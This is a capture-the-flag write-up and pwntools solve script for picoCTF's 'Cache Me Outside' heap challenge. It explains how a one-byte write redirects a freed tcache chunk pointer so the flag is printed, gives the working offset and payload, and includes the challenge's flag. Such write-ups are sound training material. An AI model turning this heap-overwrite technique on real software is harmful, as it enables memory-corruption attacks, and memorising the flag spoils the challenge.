#!/usr/bin/env python3

########################################## Write-Up ###############################################
# Challenge: Cache Me Outside
# Category: Binary Exploitation
# Description: While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. nc mercury.picoctf.net 8054 heapedit Makefile libc.so.6
# Hints:
#	-1: It may be helpful to read a little bit on GLIBC's tcache.
#
# The idea of the chall was that in heap exploitation you want to take control
# of pointers of freed chunks to be able to abuse the malloc() and free()
# algortithms to leak info or control execution flow. Looking at Ghidra,
# the binary creates 7 allocations on the heap (each size 128 bytes, going into
# tcache bin after free()), all but the first and last having the flag. To
# explain, for a Glibc library version 2.26 or later, the tcache bin is
# implemented to speed up memory operation, so with the given libc.so.6 file,
# tcache should be in play. After the initial malloc()s, the last allocation
# and penultimate one are free()d, placing them in a tcache bin in the order:
# penultimate chunk > last chunk. The program then prompts for a number to be
# an offset for the address in memory the program prompts you to modify, and
# then it prompts to modify the first byte stored at said addr with the byte you
# want to supply. The exploit lies on your ability to change a byte in any
# memory location based off the offset, and the way to use it to get the flag is
# to change the pointer holding the address of the last chunk so that it points
# to another chunk addr (in this case I chose the penultimate, which I will
# explain later why). The way I calulated the offest to input was to find the
# pointer pointing to the addr of the last chunk using the search-patter cmd
# on gef and then subtracting that by the addr of the first addr. Then, since
# I could onlt modify the pointer by one byte and the binary was in Little
# Endian, the lowest address would be the penultimate chunk addr, meaning it's
# the only chunk w/ the flag in it. Thus, when all is said and done and the last
# malloc() is called in the binary, it will actually load the penultimate chunk
# and display its contents in the last puts() function. Thus, the flag is spilt.
#
# Points: 70
# Flag: picoCTF{5c9838eff837a883a30c38001280f07d}
# Solved in picoGym

from pwn import *

exe = ELF("heapedit")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.27.so")
# Note: must have a flag.txt to make binary work or segfault happens

context.binary = exe


def conn():
	if False:
		r = process([exe.path])
	else:
		r = remote("mercury.picoctf.net", 8054)

	return r


def main():
	r = conn()
	#gdb.attach(r, 'b free')
	r.sendlineafter("Address:", "-5144") # offset
	r.sendlineafter("Value:", "\x00") # changes to addr to penultimate chunk
	r.interactive()


if __name__ == "__main__":
	main()
